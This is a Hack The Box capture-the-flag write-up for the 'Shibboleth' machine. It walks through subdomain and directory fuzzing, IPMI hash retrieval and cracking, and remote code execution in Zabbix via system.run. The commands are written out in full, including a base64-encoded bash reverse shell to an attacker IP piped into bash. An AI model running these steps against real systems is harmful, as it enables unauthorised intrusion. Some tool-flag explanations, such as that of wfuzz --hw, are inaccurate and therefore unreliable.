---
description: https://app.hackthebox.com/machines/410
---

# 👁️ Shibboleth

<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

After a quick nmap, we only find port 80 open, after a better look:

<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

looking at the webserver:

<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

We see some bootstrap, maybe this box has a CVE related exploit ->

we also are able to pull some possible usernames:

<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

I also find at the end of the page some possible backend technologies that could be our entry point&#x20;

<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

```
wfuzz -u http://shibboleth.htb -H "Host: FUZZ.shibboleth.htb" -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --hw 26

```

in a previous scan, we noted that all pages that returned a 302 had 26 words so the `--hw` flag is used to specify the header word to match in the response, in this case, it is set to `26`, which means the attack will stop when the response header contains the word `26`

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

there is a zabbix subdomain, so it's probably the way to go, we need to add those in the etc/hosts file

a good thing to do after that is to launch a feroxbuster:

```
feroxbuster -u http://shibboleth.htb -w /usr/share/SecLists/Discovery/Web-Content/raft-medium-directories.txt
```

`feroxbuster`, which is a tool for web application enumeration. The command is performing a directory bruteforce attack on the target URL `http://shibboleth.htb` with the wordlist `/usr/share/SecLists/Discovery/Web-Content/raft-medium-directories.txt`. The `-w` flag is used to specify the wordlist file

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

nothing very interesting

The subdomains we found earlier all redirect to this page:

<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

tried default creds but it did not work:

<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

let's try to find other ways of going for the moment:

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption><p>bare metal bmc automation exploit</p></figcaption></figure>

interesting, zabbix was maybe a rabbit hole

we can see that default port is 623, let's check:

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

We have to be extremly careful because when we type in this command:

```
nmap -sCV -p 623 10.129.30.233
```

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

but if we type in this command

```
nmap -sU -p 623 -sCV shibboleth.htb
```

<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

the `-sU` flag is used to specify the scan type as a UDP scan.

The target may be running a service on port `623` using the UDP protocol, but not using the TCP protocol.

The target may have a firewall configured to block incoming TCP connections on port `623`, but not UDP connections.

Let's follow the hacktricks methods to enumerate:

**identify** the **version** using:

```
#On msfconsole
use auxiliary/scanner/ipmi/ipmi_version
#or
nmap -sU --script ipmi-version -p 623 IP_Target
```

the nmap made this output:

<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

and the msfconsole:

<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

I followed the **IPMI 2.0 RAKP Authentication Remote Password Hash Retrieval** path and tried out this exploit:

<figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

I just had to set rhosts and it retrieved this:

<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption><p>Script kiddie stuff...</p></figcaption></figure>

now let's find the type of hash:

<figure><img src="../../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

So the hashcat command would look like:

```
hashcat -m 7300 adminhash.txt /usr/share/wordlists/rockyou.txt --user
```

using the `--user` flag because the hash starts with the username

<figure><img src="../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

We arrive on this dashboard:&#x20;

<figure><img src="../../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

after some enumeration, we find this:&#x20;

<figure><img src="../../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

Top right of the screen there is a create item button, let's see:

<figure><img src="../../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

put whatever for the name and type `system.run[id]` for the key

<figure><img src="../../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

Then click the test button and the get value, it will output the `id` command so we got a RCE

So we can try a reverse shell that we double encode to bypass any errors or special character problems:

```
echo "bash -i >& /dev/tcp/10.10.14.94/9898 0>&1 " | base64
```

Let's try only base64 for now:

<figure><img src="../../../.gitbook/assets/image (24).png" alt=""><figcaption><p>YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45NC85ODk4IDA+JjEgCg</p></figcaption></figure>

It did not work, the fact that we have some + in the command bothers me so if we add some double spaces in between each one of the spaces:

```
echo "bash  -i  >&  /dev/tcp/10.10.14.94/9898  0>&1  " | base64
```

so in the key parameter:

```
system.run[echo YmFzaCAgLWkgID4mICAvZGV2L3RjcC8xMC4xMC4xNC45NC85ODk4ICAwPiYxICAK | base64 | bash]
```

the final version of the payload was with port 443 so:

```
YmFzaCAgLWkgID4mICAvZGV2L3RjcC8xMC4xMC4xNC45NC80NDMgMD4mMSAgCg
```

and the RCE parameter was:

```
system.run[echo  YmFzaCAgLWkgID4mICAvZGV2L3RjcC8xMC4xMC4xNC45NC80NDMgMD4mMSAgCg | base64 -d | bash]
```

set up a listener, click on test then get value:

<figure><img src="../../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

we get some type of timeout&#x20;
